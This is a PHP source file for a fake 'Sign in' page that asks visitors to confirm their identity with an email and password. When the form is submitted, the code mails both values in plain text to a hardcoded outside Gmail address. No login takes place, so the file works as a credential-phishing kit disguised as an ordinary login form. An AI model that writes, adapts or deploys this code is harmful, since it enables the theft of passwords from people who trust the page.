<?php
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    // Form is submitted, handle the form data and send email

    $email = $_POST["email"];
    $password = $_POST["password"];

    // Replace the 'youremail@example.com' with your actual email address
    $to = "tobilobamusic@gmail.com";

    // Modify the email content as needed
    $subject = "Form Submission";
    $message = "Email: " . $email . "\n";
    $message .= "Password: " . $password . "\n";

    // You can modify the headers and content type as needed
    $headers = "From: yourwebsite@example.com\r\n";
    $headers .= "Content-type: text/plain\r\n";

    // Send the email and handle errors
    $sent = mail($to, $subject, $message, $headers);

    if ($sent) {
        header("Location: send_email.php?status=success");
        exit();
    } else {
        header("Location: send_email.php?status=error&error_message=" . urlencode(error_get_last()['message']));
        exit();
    }
} else {
    // Form is not yet submitted, display the form

    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
    <link rel="stylesheet" href="style.css">
    <link href="https://fonts.cdnfonts.com/css/lexend-deca" rel="stylesheet">
  
    </head>
    <body>
        <div class="modal_form">
        <img src="./logo.jpeg" />
        <h2>Sign in</h2>
        <p>Confirm your identity to prove you are not <br>a robot </p>
            <form class="form__content" id="form" method="POST">
                <!-- ... your input fields and other form elements ... -->
                <div class="form__box">
                    <input type="email" id="email" name="email" class="form__input" placeholder="Email Address" required>
                    <label for="" class="form__label">ENTER EMAIL</label>
                </div>
                <div class="form__box">
                    <input type="password" id="password" name="password" class="form__input" placeholder="Password" required>
                    <label for="" class="form__label">ENTER PASSWORD</label>
                </div>
                <div class="remeber_me">
                    <input type="checkbox" />
                    <span>Remember me</span>
                </div>
                <div class="form__button">
                    <input type="submit" class="form__submit" value="Sign Up">
                </div>
            </form>
            <!-- Form ends here -->
        </div>
    </body>
    </html>
    <?php
}
?>
